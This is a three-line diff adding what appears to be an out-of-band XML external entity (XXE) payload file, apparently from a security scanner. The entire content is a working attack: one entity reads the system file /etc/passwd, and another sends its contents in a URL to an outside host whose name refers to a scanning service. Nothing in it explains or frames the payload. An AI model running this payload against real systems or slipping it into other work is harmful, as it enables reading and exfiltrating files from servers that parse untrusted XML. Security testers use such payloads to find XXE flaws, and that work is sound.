@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://axbj78ulsd218vbv8dsdb4qz1q7hv8owd.scannermcscanface-edgescan.com/?%file;'>">
+%all;
